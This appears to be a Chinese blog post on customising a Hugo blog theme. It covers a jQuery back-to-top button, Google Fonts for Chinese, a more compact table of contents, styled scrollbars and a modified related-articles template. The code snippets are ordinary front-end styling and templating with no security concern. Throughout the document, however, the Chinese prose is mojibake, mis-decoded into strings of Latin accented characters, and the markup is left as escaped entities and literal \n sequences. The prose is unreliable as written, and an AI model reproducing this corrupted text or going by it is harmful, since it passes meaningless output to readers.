ä¸€ä¸ªè¿”å›é¡¶éƒ¨çš„æŒ‰é’®ï¼Œå½“é¡µé¢ä¸å¤„äºé¡¶éƒ¨æ—¶ï¼Œè¯¥æŒ‰é’®å‡ºç°ï¼Œç‚¹å‡»ä¹‹åè¿”å›é¡µé¢çš„é¡¶éƒ¨ã€‚\næŒ‰é’®çš„æ ¸å¿ƒå‡½æ•°ç›´æ¥å‚è€ƒäº† Slimä¸»é¢˜ ï¼Œå…·ä½“åšæ³•æ˜¯åœ¨ layouts/partials/head/script.html ä¸­æ·»åŠ å¦‚ä¸‹çš„ä»£ç ï¼š\n\u0026lt;script src=\u0026#34;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; // Check to see if the window is top if not then display button $(window).scroll(function() { if ($(this).scrollTop()) { $(\u0026#39;#back-to-top\u0026#39;).fadeIn(); } else { $(\u0026#39;#back-to-top\u0026#39;).fadeOut(); } }); // Click event to scroll to top $(\u0026#39;#back-to-top\u0026#39;).click(function() { $(\u0026#39;html, body\u0026#39;).animate({scrollTop: 0}, 1000); return false; }); \u0026lt;/script\u0026gt; å‡½æ•°ä½¿ç”¨äº† jQuery ç›‘å¬çª—å£çš„æ»šåŠ¨ï¼Œå¹¶æ§åˆ¶æŒ‰é’®çš„å‡ºç°ä¸æ¶ˆå¤±ï¼Œå…¶æ ¸å¿ƒæ˜¯ä¸€ä¸ªå…·å¤‡ back-to-top IDçš„HTMLå…ƒç´ ï¼Œåœ¨åŸæœ¬çš„ä¸»é¢˜ï¼ˆSlimä¸»é¢˜ï¼‰ä¸­ï¼Œè¿™ä¸ªå…ƒç´ å°±æ˜¯ä¸€ä¸ªç®€å•çš„ \u0026lt;a\u0026gt; æ ‡ç­¾ã€‚\næˆ‘å¸Œæœ›è‡ªå®šä¹‰è¿”å›é¡¶éƒ¨æŒ‰é’®çš„å¤–è§‚ï¼Œå¹¶å†³å®šä½¿ç”¨ä¸€å¼ å›¾ç‰‡æ¥ä»£æ›¿Slimä¸»é¢˜ä¸­æœ´ç´ çš„ ^ å·ã€‚\næ·»åŠ ç»„ä»¶ æ­¤å‰å·²ç»æè¿‡ï¼Œæˆ‘å¸Œæœ›è¿™ä¸ªæŒ‰é’®å°±æ”¾ç½®åœ¨æ–‡ç« ç›®å½•ä¸‹æ–¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦æ‰¾åˆ°æ–‡ç« ç›®å½•çš„HTMLä»£ç ï¼Œç„¶ååœ¨å®ƒä¸‹æ–¹æ’å…¥è¿™ä¸ªæŒ‰é’®çš„ä»£ç ã€‚\næ‰¾åˆ° layouts/_default/single.html ï¼Œåœ¨å®ƒçš„ç¬¬ 47 è¡Œæ‰¾åˆ°äº†TOCçš„ä»£ç ï¼Œåœ¨ aside å†…éƒ¨ã€TOCåº•éƒ¨æ’å…¥ä¸‹é¢çš„ä»£ç ï¼š\n{{ $topImg := resources.Get (\u0026#34;img/top.png\u0026#34;) }} {{ $topImg := $topImg.Resize \u0026#34;40x\u0026#34; }} \u0026lt;a id=\u0026#34;back-to-top\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;{{ $topImg.RelPermalink }}\u0026#34; /\u0026gt; \u0026lt;/a\u0026gt; è¿™æ®µä»£ç æ˜¯æˆ‘ä»¿ç…§ Avatar éƒ¨åˆ†çš„ä»£ç å†™å‡ºæ¥çš„ï¼Œä½œè€…ç”¨ç±»ä¼¼çš„ä»£ç å®ç°äº†ä¸»é¡µå·¦è¾¹æ çš„å¤´åƒã€‚éœ€è¦æŠŠä»£ç çš„å›¾ç‰‡è·Ÿå¤´åƒçš„å›¾ç‰‡æ”¾åœ¨ä¸€èµ·ï¼Œä¹Ÿå°±æ˜¯æ”¾åœ¨ [ç½‘ç«™æ ¹ç›®å½•]/assets/img æ–‡ä»¶ä¸­ã€‚\né‚£ä¹ˆï¼ŒTOCéƒ¨åˆ†çš„ä»£ç å°±å˜æˆäº†è¿™æ ·å­ï¼š\n{{ define \u0026#34;right-sidebar\u0026#34; }} {{ if (.Scratch.Get \u0026#34;hasTOC\u0026#34;) }} \u0026lt;aside class=\u0026#34;sidebar right-sidebar sticky\u0026#34;\u0026gt; \u0026lt;section class=\u0026#34;widget archives\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;widget-icon\u0026#34;\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;hash\u0026#34; }} \u0026lt;/div\u0026gt; \u0026lt;h2 class=\u0026#34;widget-title section-title\u0026#34;\u0026gt;{{ T \u0026#34;article.tableOfContents\u0026#34; }}\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;widget--toc\u0026#34;\u0026gt; {{ .TableOfContents }} \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; {{ $topImg := resources.Get (\u0026#34;img/top.png\u0026#34;) }} {{ $topImg := $topImg.Resize \u0026#34;40x\u0026#34; }} \u0026lt;a id=\u0026#34;back-to-top\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;{{ $topImg.RelPermalink }}\u0026#34; /\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/aside\u0026gt; {{ end }} {{ end }} æ·»åŠ æ ·å¼ æœ€åä¸€æ­¥æ˜¯å¾ˆç®€å•çš„ï¼Œæˆ‘ä»¬è¿˜æ˜¯éœ€è¦ä¸ºè¿™ä¸ªç»„ä»¶æ·»åŠ CSSæ ·å¼ã€‚\næ‰¾åˆ°ç†Ÿæ‚‰çš„ custom.scss æ–‡ä»¶ï¼Œè¿½åŠ ä¸‹é¢çš„ä»£ç ï¼š\n$hover: 0.2s ease-in-out; #back-to-top { bottom: -30px; right: 2px; display: none; position: absolute; border: 0; transition: transform $hover; \u0026amp;:hover { transform: translateY(-10px); } } è¿™é‡Œåªéœ€è¦æ³¨æ„ä¸¤ä¸ªé‡ç‚¹ï¼ˆä¹Ÿå°±æ˜¯æˆ‘åœ¨æ·»åŠ è¿™ä¸ªç»„ä»¶è¿‡ç¨‹ä¸­è¸©å‘çš„ç‚¹ï¼‰ï¼š\nposition: absolute ï¼Œèƒ½å¤Ÿå°†æŒ‰é’®å›ºå®šï¼Œä¸”å®ƒçš„çˆ¶å…ƒç´ æ˜¯æˆ‘ä»¬ä¸Šé¢çœ‹åˆ°çš„ \u0026lt;aside\u0026gt; æ ‡ç­¾ï¼Œå°±èƒ½å°†æŒ‰é’®è·ŸTOCçš„ç›¸å¯¹ä½ç½®å›ºå®šèµ·æ¥ï¼ˆå› ä¸ºä»–ä»¬åŒå±äºä¸€ä¸ªçˆ¶å…ƒç´ ï¼‰ï¼›å¦‚æœä½¿ç”¨ position: fixed å°±ä¸èƒ½èµ·åˆ°è¿™ä¸ªæ•ˆæœï¼Œå› ä¸º fixed å±æ€§ä¼šç›´æ¥å°†å®ƒçš„çˆ¶å…ƒç´ è®¾ç½®ä¸ºæµè§ˆå™¨çª—å£ã€‚ bottom: -30px ï¼Œä½¿å¾—è¿™ä¸ªæŒ‰é’®ä¸ä¼šè¢«TOCçš„è¾¹ç•ŒåŒ…ä½ï¼Œè€Œä¸”åœ¨å±å¹•ç¼©æ”¾æ—¶ä¸ä¼šè¶…å‡ºå±å¹•åº•ç«¯ï¼ˆå…¶å®å°±æ˜¯ä¸ªè¯•éªŒå€¼ï¼‰ã€‚ è‡³æ­¤å°±å¾—åˆ°äº†ä¸€ä¸ªå¾ˆæ¼‚äº®çš„è¿”å›é¡¶éƒ¨æŒ‰é’®äº†ï¼\næ•ˆæœ å­—ä½“æ ·å¼ä¿®æ”¹ æŠŠè¿™ä¸€é¡¹å½’åœ¨æ–‡ç« é¡µé¢ä¼¼ä¹ä¸å¤ªåˆé€‚ï¼Œå› ä¸ºä¸»é¡µçš„å­—ä½“æ ·å¼ä¹Ÿè¢«æˆ‘æ›´æ”¹äº†ï¼›ä½†å…¶å®å­—ä½“æ ·å¼ä¸»è¦åœ°è¿˜æ˜¯ä¸æ–‡ç« æœ‰å…³ï¼Œå¥½çš„å­—ä½“è®©äººçœ‹èµ·æ–‡ç« æ¥å¿ƒæƒ…æ„‰æ‚¦ã€‚\nä½œè€…åœ¨ layouts/partials/footer/components/custom-font.html ä¸­è¿›è¡Œäº†å­—ä½“çš„è‡ªå®šä¹‰ï¼š\n\u0026lt;script\u0026gt; (function () { const customFont = document.createElement(\u0026#39;link\u0026#39;); customFont.href = \u0026#34;https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700\u0026amp;display=swap\u0026#34;; customFont.type = \u0026#34;text/css\u0026#34;; customFont.rel = \u0026#34;stylesheet\u0026#34;; document.head.appendChild(customFont); }()); \u0026lt;/script\u0026gt; ä»–ä½¿ç”¨çš„å­—ä½“æ˜¯ Lato ï¼Œè¿™ä¸ªå­—ä½“ä¸æ”¯æŒä¸­æ–‡ï¼Œå› æ­¤æœ€ç»ˆå‘ˆç°å‡ºæ¥çš„å­—ä½“æ˜¯å¹³å¹³æ— å¥‡çš„å¾®è½¯é›…é»‘ï¼ˆå…¶å®æ˜¯ä½œè€…æ”¾ç½®çš„é»˜è®¤é€‰é¡¹ï¼‰ã€‚\næ›´æ”¹å­—ä½“çš„æ–¹å¼æœ‰å‡ ç§ï¼š\nä½¿ç”¨åœ¨çº¿å­—ä½“ï¼› ä¸‹è½½å­—ä½“CSSå¹¶å¼•å…¥ï¼› ä½¿ç”¨æ­£å¸¸PCéƒ½ä¼šæœ‰çš„å­—ä½“ï¼ˆå¦‚å¾®è½¯é›…é»‘ã€ä»¿å®‹ã€æ¥·ä½“ç­‰ï¼‰ã€‚ æˆ‘å†³å®šä½¿ç”¨åœ¨çº¿å­—ä½“ï¼Œé¦–å…ˆæ˜¯å› ä¸ºåœ¨çº¿å­—ä½“çš„æ ·å¼æ¯”è¾ƒä¸°å¯Œï¼Œå…¶æ¬¡æ˜¯å­—ä½“CSSå¹¶æ²¡æœ‰é‚£ä¹ˆå¥½æ‰¾â€¦â€¦\nç§‘å­¦ä¸Šç½‘ å»åˆ° Google fonts ï¼Œæ‰¾åˆ°æ»¡æ„çš„ä¸­æ–‡å­—ä½“ï¼ŒæŠŠ custom-font.html ä¸­çš„åŸæœ‰ä»£ç æ³¨é‡Šæ‰ï¼Œä½¿ç”¨ç½‘ç«™ç»™å‡ºçš„ä»£ç ã€‚\nç¤ºä¾‹ æˆ‘ç°åœ¨çš„ custom-font.html å†…å®¹å¦‚ä¸‹ï¼š\n\u0026lt;!-- \u0026lt;script\u0026gt; (function () { const customFont = document.createElement(\u0026#39;link\u0026#39;); customFont.href = \u0026#34;https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700\u0026amp;display=swap\u0026#34;; customFont.type = \u0026#34;text/css\u0026#34;; customFont.rel = \u0026#34;stylesheet\u0026#34;; document.head.appendChild(customFont); }()); \u0026lt;/script\u0026gt; --\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.googleapis.com\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.gstatic.com\u0026#34; crossorigin\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css2?family=Long+Cang\u0026amp;family=Ma+Shan+Zheng\u0026amp;family=Noto+Sans+SC:wght@300\u0026amp;family=Noto+Serif+SC:wght@300\u0026amp;family=Zhi+Mang+Xing\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; ä¸€æ¬¡æ€§å¼•å…¥äº†å‡ æ¬¾æˆ‘è®¤ä¸ºè¿˜ä¸é”™çš„å­—ä½“ï¼Œä»¥ä¾¿è‡ªç”±é€‰æ‹©ã€‚\nå¼•å…¥å­—ä½“ä¹‹åï¼Œæ¥åˆ°æˆ‘ä»¬çš„è€æœ‹å‹ custom.scss æ–‡ä»¶ä¸­ï¼ŒæŠŠ body å’Œ .article-content çš„å­—ä½“æ”¹ä¸ºæˆ‘ä»¬å¼•å…¥çš„å­—ä½“çš„åå­—å³å¯ã€‚\nbody, .article-content { // font-family: \u0026#39;Long Cang\u0026#39;, cursive; // font-family: \u0026#39;Ma Shan Zheng\u0026#39;, cursive; // font-family: \u0026#39;Noto Sans SC\u0026#39;, sans-serif; font-family: \u0026#39;Noto Serif SC\u0026#39;, serif; // font-family: \u0026#39;Zhi Mang Xing\u0026#39;, cursive; } ç›®å½•é¡¹ç´§å‡‘ ä½œè€…é»˜è®¤çš„æ–‡ç« é¡µé¢æ˜¯è¿™æ ·çš„ï¼š\næ–‡ç« é¡µé¢ è™½ç„¶æˆ‘å¾ˆå–œæ¬¢è¿™ä¸ªTable Of Contentçš„ä½ç½®ï¼Œä½†æˆ‘è®¤ä¸ºæ¯ä¸€ä¸ªç›®å½•ä¹‹é—´çš„è·ç¦»æœ‰ç‚¹å¤ªå¼€äº†ã€‚å¯¹äºç›®å½•çŸ­ä¸€ç‚¹çš„æ–‡ç« æ¥è¯´è¿˜å¥½ï¼Œå¯¹äºç›®å½•å¾ˆé•¿çš„æ–‡ç« æ¥è¯´ï¼Œè¿™ä¹ˆå¤§çš„é—´è·æ˜¾å¾—ä¸å¤Ÿç²¾è‡´ã€‚\nç›®å½•è¾ƒé•¿æƒ…å†µä¸‹çš„æ•ˆæœ è€è§„çŸ©ï¼Œå¼€å‘è€…å·¥å…·é€‰ä¸­ã€æ‰¾classã€æœç´¢ä¸€æ¡é¾™ï¼Œåœ¨ assets/scss/partials/layout/article.scss ä¸­æ‰¾åˆ°äº†æ§åˆ¶TOCæ ¼å¼çš„ä»£ç ï¼š\n.widget--toc { background-color: var(--card-background); border-radius: var(--card-border-radius); box-shadow: var(--shadow-l1); display: flex; flex-direction: column; color: var(--card-text-color-main); overflow: hidden; #TableOfContents { overflow-x: auto; max-height: 75vh; ol, ul { margin: 0; padding: 0; } ol { list-style-type: none; counter-reset: item; li:before { counter-increment: item; content: counters(item, \u0026#34;.\u0026#34;) \u0026#34;. \u0026#34;; font-weight: bold; margin-right: 5px; } } \u0026amp; \u0026gt; ul { padding: 0 1em; } li { margin: 15px 20px; padding: 5px; \u0026amp; \u0026gt; ol, \u0026amp; \u0026gt; ul { margin-top: 10px; padding-left: 10px; margin-bottom: -5px; \u0026amp; \u0026gt; li:last-child { margin-bottom: 0; } } } } } åªéœ€è¦æŠŠé‡ç‚¹æ”¾åœ¨è¯¸å¦‚ padding ã€ margin ä¸€ç±»çš„å­—çœ¼ä¸Šå³å¯ã€‚\nå®¡è§† #TableOfContents é€‰æ‹©å™¨åº•ä¸‹çš„å‡ ä¸ªå±æ€§ï¼ˆå·²ç»åˆ å»è¾ƒä¸é‡è¦çš„æ ·å¼ï¼‰ï¼š\n#TableOfContents { max-height: 75vh; // æ§åˆ¶ç›®å½•çš„æœ€å¤§é«˜åº¦ li { margin: 15px 20px; // æ§åˆ¶åˆ—è¡¨é¡¹ä¹‹é—´çš„è·ç¦»ï¼ˆé‡è¦ï¼ï¼‰ padding: 5px; \u0026amp; \u0026gt; ol, \u0026amp; \u0026gt; ul { margin-top: 10px; // æ§åˆ¶å­åˆ—è¡¨å’Œçˆ¶åˆ—è¡¨é¡¹ä¹‹é—´çš„è·ç¦»ï¼ˆå½“TOCä¸åªæœ‰ä¸€å±‚ç›®å½•çš„æ—¶å€™æœ‰ç”¨ï¼‰ padding-left: 10px; // å­åˆ—è¡¨é¡¹çš„å‘å³ç¼©è¿›è·ç¦»ï¼ˆå½“TOCä¸åªæœ‰ä¸€å±‚ç›®å½•çš„æ—¶å€™æœ‰ç”¨ï¼‰ margin-bottom: -5px; \u0026amp; \u0026gt; li:last-child { margin-bottom: 0; } } } } ç»è¿‡ä¸€ç•ªä¿®æ”¹ï¼Œæˆ‘åœ¨ custom.scss ä¸­æ·»åŠ äº†å¦‚ä¸‹çš„æ ·å¼ï¼š\n.widget--toc { #TableOfContents { max-height: 65vh; ol, ul { list-style-type: none; } li { margin: 10px 10px; \u0026amp; \u0026gt; ol, \u0026amp; \u0026gt; ul { margin-top: 10px; padding-left: 10px; margin-bottom: -5px; \u0026amp; \u0026gt; li:last-child { margin-bottom: 0; } } } } } ä¸»è¦è§£å†³äº†å‡ ä¸ªé—®é¢˜ï¼š\nç›®å½•å¤ªé«˜äº†ï¼Œä½¿å¾—ä¹‹å‰æ·»åŠ çš„è¿”å›é¡¶éƒ¨æŒ‰é’®å¯èƒ½ä¼šè¢«é¡¶å‡ºå±å¹•ï¼› ç›®å½•é¡¹å‰é¢çš„å°é»‘ç‚¹ä¸å¤ªå¥½çœ‹ï¼Œéšå»ï¼› ç›®å½•é¡¹ä¹‹é—´çš„è·ç¦»ä¸å¤Ÿç´§å‡‘ã€‚ è¿›è¡Œä¸€ä¸‹å¯¹æ¯”ï¼Œä¸ªäººæ˜¯æ»¡æ„è¿™ä¸ªæ•ˆæœçš„ï¼š\næ—§ç›®å½•æ•ˆæœ æ–°ç›®å½•æ•ˆæœ æ»šåŠ¨æ¡ç¾åŒ– å°½ç®¡ç»è¿‡äº†ç´§å‡‘ï¼Œç›®å½•è¿˜æ˜¯å¯èƒ½å‡ºç°è¿‡é•¿çš„æƒ…å†µï¼Œè€ŒåŸæœ¬çš„æ ·å¼ä¸­ç›®å½•çš„æ»šåŠ¨æ¡æ¯«æ— ç–‘é—®æ˜¯ç²—ç³™çš„ï¼Œç”šè‡³ä»¤äººå¾ˆéš¾æ¥å—ã€‚\nç½‘ç»œä¸Šæœ‰éå¸¸å¤šè‡ªå®šä¹‰æ»šåŠ¨æ¡çš„æ•™ç¨‹ï¼Œä½†æ˜¯æˆ‘æ‡’å¾—è‡ªè¡Œè°ƒè¯•ï¼Œç›´æ¥ä½¿ç”¨Cabrielå¤§ä½¬åœ¨ è¿™ç¯‡æ–‡ç«  ä¸­ç»™å‡ºçš„ ä»£ç  ï¼Œå°†ä»£ç ä¸­è‡ªå®šä¹‰æ»šåŠ¨æ¡çš„éƒ¨åˆ†åŠ åˆ°ä¸Šä¸€å°èŠ‚ä¸­TOCçš„æ ·å¼é‡Œï¼Œä½¿å¾—ä¸Šä¸€å°èŠ‚é‡Œä¿®æ”¹è¿‡çš„TOCæ ·å¼å˜æˆä¸‹é¢çš„æ ·å­ï¼š\n.widget--toc { #TableOfContents { max-height: 65vh; ol, ul { list-style-type: none; } li { margin: 10px 10px; \u0026amp; \u0026gt; ol, \u0026amp; \u0026gt; ul { margin-top: 10px; padding-left: 10px; margin-bottom: -5px; \u0026amp; \u0026gt; li:last-child { margin-bottom: 0; } } } } ::-webkit-scrollbar { width: 20px; } ::-webkit-scrollbar-track { background-color: transparent; } ::-webkit-scrollbar-thumb { background-color: #d6dee1; border-radius: 20px; border: 6px solid transparent; background-clip: content-box; } ::-webkit-scrollbar-thumb:hover { background-color: #a8bbbf; } } æ—§ç›®å½•æ»šåŠ¨æ¡æ•ˆæœ æ–°ç›®å½•æ»šåŠ¨æ¡æ•ˆæœ å±å®æ˜¯æå‡å¹¸ç¦æ„Ÿçš„ä¸€ä¸ªç»†èŠ‚å•Šï¼\næˆ‘å®åœ¨å¤ªå–œæ¬¢è¿™ä¸ªæ»šåŠ¨æ¡äº†ï¼Œä»¥è‡³äºæˆ‘ä¸å¸Œæœ›å®ƒä»…ä»…ä½œç”¨åœ¨ç›®å½•ä¸Šã€‚\nåœ¨æˆ‘çš„åšå®¢ä¸­è¿˜æœ‰è‹¥å¹²å‡ºç°æ»šåŠ¨æ¡çš„åœ°æ–¹ï¼Œéƒ½æ˜¯åŠå…¶ç²—ç³™çš„æµè§ˆå™¨åŸå§‹æ ·å¼ï¼š\nä»£ç å—çš„æ»šåŠ¨æ¡ ç›¸å…³æ–‡ç« çš„æ»šåŠ¨æ¡ æ— æ³•å¿å—ï¼\nå› æ­¤æˆ‘å†³å®šç›´æ¥å°†æ»šåŠ¨æ¡ä¼˜åŒ–çš„ä»£ç æ‹¿å‡ºæ¥ï¼Œä½œç”¨åˆ° æ•´ä¸ªç½‘ç«™ ä¸Šï¼æ²¡é”™ï¼Œæˆ‘å¸Œæœ›ä½¿å¾—è®¿å®¢åœ¨æˆ‘çš„åšå®¢çš„ä»»æ„ä¸€ä¸ªè§’è½éƒ½ä¸ä¼šè§åˆ°åŸå§‹çš„ã€ä¸‘é™‹çš„æ»šåŠ¨æ¡ï¼\nç®€å•ç²—æš´åœ°åœ¨ custom.scss è¿½åŠ ï¼š\nhtml{ ::-webkit-scrollbar { width: 20px; } ::-webkit-scrollbar-track { background-color: transparent; } ::-webkit-scrollbar-thumb { background-color: #d6dee1; border-radius: 20px; border: 6px solid transparent; background-clip: content-box; } ::-webkit-scrollbar-thumb:hover { background-color: #a8bbbf; } } æ³¨æ„ï¼Œä¸ºäº†ä½¿å¾—ä»£ç ç®€æ´ï¼Œæˆ‘ä»¬æŠŠæ»šåŠ¨æ¡ç¾åŒ–çš„éƒ¨åˆ†æ‹¿å‡ºæ¥ä¹‹åï¼Œè¦å›åˆ°TOCæ ·å¼é‚£è¾¹æŠŠç›¸åŒçš„è¿™äº›ä»£ç åˆ æ‰ã€‚\nç°åœ¨ï¼Œåœ¨æˆ‘ç½‘ç«™çš„æ‰€æœ‰åœ°æ–¹ï¼Œä¹ƒè‡³äºæœ€å¤–å±‚çš„çª—å£å³ä¾§çš„æ»šåŠ¨æ¡éƒ½å·²ç»å˜æˆäº†ä¼˜é›…çš„æ ·å­ ğŸ˜ ã€‚\næ³¨ï¼šå¸Œæœ›è¯»è€…ä½¿ç”¨çš„ ä¸æ˜¯ FireFoxæµè§ˆå™¨ ã€‚\nç›¸å…³æ–‡ç« ç»„ä»¶ç¾åŒ– æ—§æœ‰çš„ ç›¸å…³æ–‡ç«  å…¶å®ä¸€ç›´ä»¤æˆ‘æ¯”è¾ƒéš¾å—ã€‚JimmyCaiå¤§ä½¬åœ¨è®¾è®¡æ–‡ç« åˆ—è¡¨çš„æ—¶å€™æ˜¯è€ƒè™‘äº†æ¯ä¸ªæ–‡ç« é…ä¸€ä¸ªå°é¢å›¾çš„ï¼Œå› æ­¤åœ¨ ç›¸å…³æ–‡ç«  ä¸€æ ä¹Ÿè€ƒè™‘äº†å›¾ç‰‡çš„å­˜åœ¨ï¼Œä½¿å¾—å•ä¸ªå…ƒç´ æ˜¾å¾—æ¯”è¾ƒé«˜å¤§ï¼š\næ—§ä¸»é¢˜ç›¸å…³æ–‡ç«  å‡å¦‚è¿™äº›æ ‡é¢˜èƒ½å¤Ÿåœ¨å‚ç›´ä¸Šå±…ä¸­ï¼Œæˆ‘å€’ä¹Ÿæ— æ‰€è°“äº†ï¼Œé—®é¢˜åœ¨äºè¿™äº›æ ‡é¢˜å®ƒå±…ä¸­ä¸äº†â€¦â€¦\nå› æ­¤æˆ‘å†³å®šä»å‡ ä¸ªæ–¹é¢æ¥ç¨å¾®æ”¹å–„ä¸€ä¸‹è§†è§‰æ•ˆæœï¼š\nåœ¨ç›¸å…³æ–‡ç« æ¨èçš„æ—¶å€™ï¼Œå¤šæ˜¾ç¤ºä¸€äº›å…ƒç´ ï¼ˆä¸è¦åªæ˜¾ç¤ºä¸€ä¸ªæ ‡é¢˜ï¼‰ï¼› ä¸ä½¿ç”¨æ–‡ç« å°é¢ï¼ˆæœ¬æ¥ä¹Ÿä¸æ‰“ç®—æ¯ä¸ªæ–‡ç« éƒ½é…å°é¢ï¼‰è€Œæ˜¯å±•ç¤ºæˆ‘ä»¬è‡ªè¡Œé€‰å®šçš„å›¾ç‰‡ã€‚ ä¾ç„¶æ˜¯ç†Ÿæ‚‰çš„å¼€å‘è€…å·¥å…·é€‰ä¸­æ“ä½œï¼Œåœ¨ layouts/partials/article/components/related-contents.html æ‰¾åˆ° ç›¸å…³æ–‡ç«  ç»„ä»¶çš„ä»£ç ï¼š\n\u0026lt;aside class=\u0026#34;related-contents--wrapper\u0026#34;\u0026gt; {{ $related := (where (.Site.RegularPages.Related .) \u0026#34;Params.hidden\u0026#34; \u0026#34;!=\u0026#34; true) | first 5 }} {{ with $related }} \u0026lt;h2 class=\u0026#34;section-title\u0026#34;\u0026gt;{{ T \u0026#34;article.relatedContents\u0026#34; }}\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;related-contents\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex article-list--tile\u0026#34;\u0026gt; {{ range . }} {{ partial \u0026#34;article-list/tile\u0026#34; (dict \u0026#34;context\u0026#34; . \u0026#34;size\u0026#34; \u0026#34;250x150\u0026#34; \u0026#34;Type\u0026#34; \u0026#34;articleList\u0026#34;) }} {{ end }} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/aside\u0026gt; ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå®ƒä½¿ç”¨çš„æ˜¯ layouts/partials/article-list/tile.html è¿™ä¸ªé¡µé¢æä¾›çš„æ–‡ç« åˆ—è¡¨ï¼Œå…¶ä»£ç ä¸ºï¼š\n{{ $image := partialCached \u0026#34;helper/image\u0026#34; (dict \u0026#34;Context\u0026#34; .context \u0026#34;Type\u0026#34; .Type) .context.RelPermalink .Type }} \u0026lt;article class=\u0026#34;{{ if $image.exists }}has-image{{ end }}\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;{{ .context.RelPermalink }}\u0026#34;\u0026gt; {{ if $image.exists }} \u0026lt;!-- å¿…ç„¶ä¸º falseï¼Œå› ä¸ºæˆ‘ä»¬çš„æ–‡ç« æ²¡é…å°é¢ --\u0026gt; \u0026lt;div class=\u0026#34;article-image\u0026#34;\u0026gt; \u0026lt;!-- ==== å› æ­¤è¿™éƒ¨åˆ†ä»£ç ä¸é‡è¦ï¼Œç•¥ ===== --\u0026gt; \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;article-details\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;article-title\u0026#34;\u0026gt; {{- .context.Title -}} \u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/article\u0026gt; æ ¹æ®æˆ‘ä»¬çš„ä¸¤ç‚¹ç›®æ ‡ï¼Œæˆ‘ä»¬åº”è¯¥ï¼š\nåœ¨ä¸‹é¢ä¸€ä¸ª div ä¸­æ·»åŠ  title ä¹‹å¤–çš„å…ƒç´ ï¼Œåœ¨è¿™é‡Œæˆ‘å¸Œæœ›æŠŠæ–‡ç« çš„å‘è¡¨æ—¥æœŸä¹Ÿå‘ˆç°å‡ºæ¥ï¼› ç»•è¿‡ image.exists çš„é€»è¾‘ï¼Œç›´æ¥ç”¨ä½œè€…çš„ div åŒ…ä½è‡ªå·±é€‰ç”¨çš„å›¾ç‰‡ã€‚ ç¬¬ä¸€ç‚¹éå¸¸ç®€å•ï¼Œä»¿ç…§ layouts/partials/article-list/compact.html ä»£ç ï¼Œåœ¨ h2 æ ‡ç­¾ä¸‹æ·»åŠ ä¸€ä¸ª footer å³å¯ï¼›\nç¬¬äºŒç‚¹åŒæ ·ç®€å•ï¼Œæ­¤å‰å·²ç»ä»¿ç…§Avatarçš„ä»£ç å†™è¿‡è¿”å›é¡¶éƒ¨æŒ‰é’®ï¼Œåˆ™åœ¨è¿™é‡Œä½¿ç”¨ç›¸åŒçš„åŠæ³•æ·»åŠ ä¸€å¼ å›¾ç‰‡å³å¯ã€‚\nä¿®æ”¹è¿‡åçš„ tile.html ä»£ç å¦‚ä¸‹ï¼š\n{{ $image := partialCached \u0026#34;helper/image\u0026#34; (dict \u0026#34;Context\u0026#34; .context \u0026#34;Type\u0026#34; .Type) .context.RelPermalink .Type }} \u0026lt;article class=\u0026#34;{{ if $image.exists }}has-image{{ end }}\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;{{ .context.RelPermalink }}\u0026#34;\u0026gt; {{ if $image.exists }} \u0026lt;!-- å¿…ç„¶ä¸º falseï¼Œå› ä¸ºæˆ‘ä»¬çš„æ–‡ç« æ²¡é…å°é¢ --\u0026gt; \u0026lt;div class=\u0026#34;article-image\u0026#34;\u0026gt; \u0026lt;!-- ==== å› æ­¤è¿™éƒ¨åˆ†ä»£ç ä¸é‡è¦ï¼Œç•¥ ===== --\u0026gt; \u0026lt;/div\u0026gt; {{ end }} \u0026lt;!-- è‡ªè¡Œå¢åŠ çš„å›¾ç‰‡ --\u0026gt; \u0026lt;div class=\u0026#34;article-image\u0026#34;\u0026gt; {{ $relatedImage := resources.Get (\u0026#34;img/related-content.png\u0026#34;) }} \u0026lt;img src=\u0026#34;{{ $relatedImage.RelPermalink }}\u0026#34; loading=\u0026#34;lazy\u0026#34; data-key=\u0026#34;{{ .context.Slug }}\u0026#34; data-hash=\u0026#34;{{ $image.permalink }}\u0026#34; style=\u0026#34;opacity: 0.3;\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;article-details\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;article-title\u0026#34;\u0026gt; {{- .context.Title -}} \u0026lt;/h2\u0026gt; \u0026lt;!-- è‡ªè¡Œå¢åŠ çš„æ–‡ç« å‘å¸ƒæ—¥æœŸ --\u0026gt; \u0026lt;footer class=\u0026#34;article-time\u0026#34;\u0026gt; \u0026lt;time datetime=\u0026#39;{{ .Date.Format \u0026#34;2006-01-02T15:04:05Z07:00\u0026#34; }}\u0026#39;\u0026gt; {{- .context.Date.Format (or .Site.Params.dateFormat.published \u0026#34;Jan 02, 2006\u0026#34;) -}} \u0026lt;/time\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; 